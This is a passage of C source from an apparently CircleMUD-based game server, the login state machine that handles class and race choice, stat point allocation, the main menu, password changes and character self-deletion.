      STATE(d) = CON_QCLASS;
      sprintf(buf, "%s [%s] new player.", GET_NAME(d->character), d->host);
      mudlog(buf, NRM, LVL_IMMORT, TRUE);
      return;
      break;
    default:
      SEND_TO_Q("Pay attention.  Pick Y or N.  Color?\r\n", d);
      return;
      break;
    }

  case CON_QCLASS:
    if (*arg=='?') {
      two_arguments(arg, buf, buf2);
      do_help(d->character, buf2, 0, 0);
      SEND_TO_Q(class_menu, d);
      return;
    } else {
      load_result = parse_class(*arg);
      if (load_result == CLASS_UNDEFINED) {
        SEND_TO_Q("\r\nThat's not a class.\r\nClass: ", d);
        return;
      } else
        GET_CLASS(d->character) = load_result;
        if (GET_CLASS(d->character) == CLASS_SORCERER)
          SEND_TO_Q(race_menu_sorc, d);
        if (GET_CLASS(d->character) == CLASS_CLERIC)
          SEND_TO_Q(race_menu_cleric, d);
        if (GET_CLASS(d->character) == CLASS_GLADIATOR)
          SEND_TO_Q(race_menu_glad, d);
        if (GET_CLASS(d->character) == CLASS_THIEF)
          SEND_TO_Q(race_menu_thief, d);
        if (GET_CLASS(d->character) == CLASS_PALADIN)
          SEND_TO_Q(race_menu_pal, d);
        if (GET_CLASS(d->character) == CLASS_DARK_KNIGHT)
          SEND_TO_Q(race_menu_dk, d);
        if (GET_CLASS(d->character) == CLASS_MONK)
          SEND_TO_Q(race_menu_monk, d);
        if (GET_CLASS(d->character) == CLASS_DRUID)
          SEND_TO_Q(race_menu_druid, d);
        STATE(d) = CON_QRACE;
        return;
        break;
    }

  case CON_QRACE:
    load_result = parse_race(arg);
    if (load_result == RACE_UNDEFINED) {
      SEND_TO_Q("\r\nThat's not a race.\r\n", d);
      SEND_TO_Q("Returning to class menu.\r\n", d);
      SEND_TO_Q(class_menu, d);
      STATE(d) = CON_QCLASS;
      return;
    } else if(load_result==RACE_VALKYRIE && GET_SEX(d->character)!=SEX_FEMALE) {
        SEND_TO_Q("\r\n/cCValkyrie is a female-only race.\r\n"
                  "Select another/c0.\r\n"
                  "Returning to class menu.\r\n", d);
        SEND_TO_Q(class_menu, d);
        STATE(d) = CON_QCLASS;
        return;
    } else if(load_result==RACE_SPRITE && GET_SEX(d->character)!=SEX_FEMALE) {
        SEND_TO_Q("\r\n/cCSprite is a female-only race.\r\n"
                  "Select another/c0.\r\n"
                  "Returning to class menu.\r\n", d);
        SEND_TO_Q(class_menu, d);
        STATE(d) = CON_QCLASS;
        return; 
    } else if(load_result==RACE_NYMPH && GET_SEX(d->character)!=SEX_FEMALE) {
        SEND_TO_Q("\r\n/cCNymph is a female-only race.\r\n"
                  "Select another/c0.\r\n"
                  "Returning to class menu.\r\n", d);
        SEND_TO_Q(class_menu, d);
        STATE(d) = CON_QCLASS;
        return; 
    } else if(load_result==RACE_HARPY && GET_SEX(d->character)!=SEX_FEMALE) {
        SEND_TO_Q("\r\n/cCHarpy is a female-only race.\r\n"
                  "Select another/c0.\r\n"
                  "Returning to class menu.\r\n", d);
        SEND_TO_Q(class_menu, d);
        STATE(d) = CON_QCLASS;
        return;
    } else if(load_result==RACE_TRITON && GET_SEX(d->character)!=SEX_MALE) {
        SEND_TO_Q("\r\n/cCTriton is a male-only race.  "
                  "Select another/c0.\r\n"
                  "Returning to class menu.\r\n", d);
        SEND_TO_Q(class_menu, d);
        STATE(d) = CON_QCLASS;
        return;
    } else if(load_result==RACE_GARGOYLE && GET_SEX(d->character)!=SEX_MALE) {
        SEND_TO_Q("\r\n/cCGargoyle is a male-only race.  "
                  "Select another/c0.\r\n"
                  "Returning to class menu.\r\n", d);
        SEND_TO_Q(class_menu, d);
        STATE(d) = CON_QCLASS;
        return;
    } else
      GET_RACE(d->character) = load_result;

  /*reset the char's stats.*//*Storm 7/15/98*/
  d->character->real_stats.intel = MIN_STAT(d->character, STAT_INT);
  d->character->real_stats.wis = MIN_STAT(d->character, STAT_WIS);
  d->character->real_stats.dex = MIN_STAT(d->character, STAT_DEX);
  d->character->real_stats.str = MIN_STAT(d->character, STAT_STR);
  d->character->real_stats.str_add = 0;
  d->character->real_stats.con = MIN_STAT(d->character, STAT_CON);
  d->character->real_stats.cha = MIN_STAT(d->character, STAT_CHA);
  d->character->real_stats.luck = MIN_STAT(d->character, STAT_LUCK);
  d->character->stats = 40;
  stat_screen(d);
  break;

   case CON_ROLL_STATS:
     switch(*arg) {
       case 'S':
         if (d->character->stats < 2 || d->character->real_stats.str > (MAX_STAT(d->character, STAT_STR)-1)) break;
         else { d->character->real_stats.str++; d->character->stats -= 2; }
         break;
       case 's':
         if (d->character->real_stats.str < (MIN_STAT(d->character, STAT_STR)+1)) break;
         else { d->character->real_stats.str--; d->character->stats += 2; }
         break;
       case 'D':
         if (d->character->stats < 2 || d->character->real_stats.dex > (MAX_STAT(d->character, STAT_DEX)-1)) break;
         else { d->character->real_stats.dex++; d->character->stats -= 2; }
         break;
       case 'd':
         if (d->character->real_stats.dex < (MIN_STAT(d->character, STAT_DEX)+1)) break;
         else { d->character->real_stats.dex--; d->character->stats += 2; }
         break;
       case 'I':
         if (d->character->stats < 2 || d->character->real_stats.intel > (MAX_STAT(d->character, STAT_INT)-1)) break;
         else { d->character->real_stats.intel++; d->character->stats -= 2; }
         break;
       case 'i':
         if (d->character->real_stats.intel < (MIN_STAT(d->character, STAT_INT)+1)) break;
         else { d->character->real_stats.intel--; d->character->stats += 2; }
         break;
       case 'W':
         if (d->character->stats < 3 || d->character->real_stats.wis > (MAX_STAT(d->character, STAT_WIS)-1)) break;
         else { d->character->real_stats.wis++; d->character->stats -= 3; }
         break;
       case 'w':
         if (d->character->real_stats.wis < (MIN_STAT(d->character, STAT_WIS)+1)) break;
         else { d->character->real_stats.wis--; d->character->stats += 3; }
         break;
       case 'C':
         if (d->character->stats < 3 || d->character->real_stats.con > (MAX_STAT(d->character, STAT_CON)-1)) break;
         else { d->character->real_stats.con++; d->character->stats -= 3; }
         break;
       case 'c':
         if (d->character->real_stats.con < (MIN_STAT(d->character, STAT_CON)+1)) break;
         else { d->character->real_stats.con--; d->character->stats += 3; }
         break;
       case 'H':
         if (d->character->stats < 2 || d->character->real_stats.cha > (MAX_STAT(d->character, STAT_CHA)-1)) break;
         else { d->character->real_stats.cha++; d->character->stats -= 2; }
         break;
       case 'h':
         if (d->character->real_stats.cha < (MIN_STAT(d->character, STAT_CHA)+1)) break;
         else { d->character->real_stats.cha--; d->character->stats += 2; }
         break;
       case 'L':
         if (d->character->stats < 2 || d->character->real_stats.luck > (MAX_STAT(d->character, STAT_LUCK)-1)) break;
         else { d->character->real_stats.luck++; d->character->stats -= 2; }
         break;
       case 'l':
         if (d->character->real_stats.luck < (MIN_STAT(d->character, STAT_LUCK)+1)) break;
         else { d->character->real_stats.luck--; d->character->stats += 2; }
         break;
       case 'F':
         GET_HOME(d->character) = HOME_MIDGAARD;

         if (GET_PFILEPOS(d->character) < 0)
           GET_PFILEPOS(d->character) = create_entry(GET_NAME(d->character));
           init_char(d->character);

          SET_BIT_AR(PRF_FLAGS(d->character), PRF_SHOWTIPS);
          SET_BIT_AR(PRF_FLAGS(d->character), PRF_ARENA);
          save_char(d->character, NOWHERE);

          SEND_TO_Q(motd, d);
          SEND_TO_Q("\r\n\n*** PRESS RETURN: ", d);
          STATE(d) = CON_RMOTD;
          return;
        default:
          break;
       }  stat_screen(d);
     break; /*End Storm */

  case CON_RMOTD:		/* read CR after printing motd   */
    SEND_TO_Q(MENU, d);
    STATE(d) = CON_MENU;
    break;

  case CON_MENU:		/* get selection from main menu  */
    switch (*arg) {
    case '0':
      SEND_TO_Q("Goodbye.\r\n", d);
      STATE(d) = CON_CLOSE;
      break;

    case '1':
      reset_char(d->character);
      if(multi_check(d->character) && !PLR_FLAGGED(d->character, PLR_MULTI_OK)) { 
         send_to_char("This character has not been cleared for multiplay.\r\n", d->character);
         send_to_char("Please contact a staff member for assistance.\r\n", d->character);
         send_to_char("For contact info see our webpage http:////www.dibrova.org\r\n", d->character);
         SEND_TO_Q("Goodbye.\r\n", d);
         STATE(d) = CON_CLOSE;
         break;

      }
      /* Storm 7/30/98 */
      if (GET_LEVEL(d->character) >= LVL_IMMORT)
        GET_INVIS_LEV(d->character) = 151;
      if (PLR_FLAGGED(d->character, PLR_INVSTART))
	GET_INVIS_LEV(d->character) = GET_LEVEL(d->character);
      /* put character to their loadroom before autoequipping them */
      if ((load_room = GET_LOADROOM(d->character)) != NOWHERE)
	load_room = real_room(load_room);

      /* If char was saved with NOWHERE, or real_room above failed... */
      if (load_room == NOWHERE) {
	if (GET_LEVEL(d->character) >= LVL_IMMORT) {
	  load_room = r_immort_start_room;
	} else {
          load_room = real_room(get_default_room(d->character));
	}
      }

      if (PLR_FLAGGED(d->character, PLR_FROZEN))
	load_room = r_frozen_start_room;

      char_to_room(d->character, load_room);
      if ((load_result = Crash_load(d->character)))
 	if (GET_LEVEL(d->character) < LVL_IMMORT &&
 	    !PLR_FLAGGED(d->character, PLR_FROZEN)) {
 	  char_from_room(d->character);
 	  char_to_room(d->character, load_room);
 	}
      /* with the copyover patch, this next line goes in enter_player_game() */
      GET_ID(d->character) = GET_IDNUM(d->character);
 
      save_char(d->character, NOWHERE);
      send_to_char(WELC_MESSG, d->character);
      d->character->next = character_list;
      character_list = d->character;
      act("$n has entered the game.", TRUE, d->character, 0, 0, TO_ROOM);

      /* with the copyover patch, this next line goes in enter_player_game() */
      read_saved_vars(d->character);

      greet_mtrigger(d->character, -1);
      greet_memory_mtrigger(d->character);

      STATE(d) = CON_PLAYING;
      if (!GET_LEVEL(d->character)) {
	do_start(d->character);
	do_newbie(d->character);
	send_to_char(START_MESSG, d->character);
      }
      look_at_room(d->character, 0);
      if (has_mail(GET_IDNUM(d->character)))
	send_to_char("You have mail waiting.\r\n", d->character);
      if (load_result == 2) {	/* rented items lost */
	send_to_char("\r\n\007You could not afford your rent!\r\n"
	  "Your possesions have been donated to the Salvation Army!\r\n",
		     d->character);
      }
      d->has_prompt = 0;

      sprintf(constr, "/cG%s has entered the realm./c0\r\n",
              GET_NAME(d->character));
  //    write_event(constr);
      for (k = descriptor_list; k; k = k->next, i++) {
        if (GET_LEVEL(d->character) >= LVL_IMMORT) { i = i-1; }
        if (!k->connected && GET_LEVEL(d->character) < LVL_IMMORT &&
            k != d && !PRF_FLAGGED(k->character, PRF_NOINFO)) {
          send_to_char(constr, k->character);
        }
      }
      most_on = MAX(most_on, i);
       if(clan[find_clan_by_id(GET_CLAN(d->character))].raided && clan[find_clan_by_id(GET_CLAN(d->character))].seen) {
      	sprintf(buf, "/cRCLAN INFO: Your clan hall was raided by %s!/c0\r\n", clan[clan[find_clan_by_id(GET_CLAN(d->character))].raided].name);
        send_to_char(buf, d->character);
	clan[find_clan_by_id(GET_CLAN(d->character))].seen--;
        save_clans();
      }
      break;

    case '2':
      page_string(d, background, 0);
      STATE(d) = CON_RMOTD;
      break;

    case '3':
      SEND_TO_Q("\r\nEnter your old password: ", d);
      echo_off(d);
      STATE(d) = CON_CHPWD_GETOLD;
      break;

    case '4':
      SEND_TO_Q("\r\nEnter your password for verification: ", d);
      echo_off(d);
      STATE(d) = CON_DELCNF1;
      break;

    case '5':
      do_who(d->character, " ", 0, 0);
      SEND_TO_Q("\r\nHit ENTER to continue...\r\n", d);
      STATE(d) = CON_RMOTD;
      break;

    default:
      SEND_TO_Q("\r\nThat's not a menu choice!\r\n", d);
      SEND_TO_Q(MENU, d);
      break;
    }

    break;

  case CON_CHPWD_GETOLD:
    if (strncmp(CRYPT(arg, GET_PASSWD(d->character)), GET_PASSWD(d->character), MAX_PWD_LENGTH)) {
      echo_on(d);
      SEND_TO_Q("\r\nIncorrect password.\r\n", d);
      SEND_TO_Q(MENU, d);
      STATE(d) = CON_MENU;
      return;
    } else {
      SEND_TO_Q("\r\nEnter a new password: ", d);
      STATE(d) = CON_CHPWD_GETNEW;
      return;
    }
    break;

  case CON_DELCNF1:
    echo_on(d);
    if (strncmp(CRYPT(arg, GET_PASSWD(d->character)), GET_PASSWD(d->character), MAX_PWD_LENGTH)) {
      SEND_TO_Q("\r\nIncorrect password.\r\n", d);
      SEND_TO_Q(MENU, d);
      STATE(d) = CON_MENU;
    } else {
      SEND_TO_Q("\r\nYOU ARE ABOUT TO DELETE THIS CHARACTER PERMANENTLY.\r\n"
		"ARE YOU ABSOLUTELY SURE?\r\n\r\n"
		"Please type \"yes\" to confirm: ", d);
      STATE(d) = CON_DELCNF2;
    }
    break;

  case CON_DELCNF2:
    if (!strcmp(arg, "yes") || !strcmp(arg, "YES")) {
      if (PLR_FLAGGED(d->character, PLR_FROZEN)) {
	SEND_TO_Q("You try to kill yourself, but the ice stops you.\r\n", d);
	SEND_TO_Q("Character not deleted.\r\n\r\n", d);
	STATE(d) = CON_CLOSE;
	return;
      }

      if (PLR_FLAGGED(d->character, PLR_TOAD)) {
        SEND_TO_Q("Don't be such a baby. Ribbit. Ribbit.\r\n", d);
	SEND_TO_Q("Character not deleted.\r\n\r\n", d);
        STATE(d) = CON_CLOSE;
        return;
      }

      if (GET_LEVEL(d->character) < LVL_BUILDER)
	SET_BIT_AR(PLR_FLAGS(d->character), PLR_DELETED);
      save_char(d->character, NOWHERE);
      Crash_delete_file(GET_NAME(d->character));
      sprintf(buf, "Character '%s' deleted!\r\n"
	      "Goodbye.\r\n", GET_NAME(d->character));
      SEND_TO_Q(buf, d);
      sprintf(buf, "%s (lev %d) has self-deleted.", GET_NAME(d->character),
	      GET_LEVEL(d->character));
      mudlog(buf, NRM, LVL_ADMIN, TRUE);
      STATE(d) = CON_CLOSE;
      return;
    } else {
      SEND_TO_Q("\r\nCharacter not deleted.\r\n", d);
      SEND_TO_Q(MENU, d);
      STATE(d) = CON_MENU;
    }
    break;

  case CON_CLOSE:
    close_socket(d);
    break;

  default:
    log("SYSERR: Nanny: illegal state of con'ness; closing connection");
    close_socket(d);
    break;
  }
}
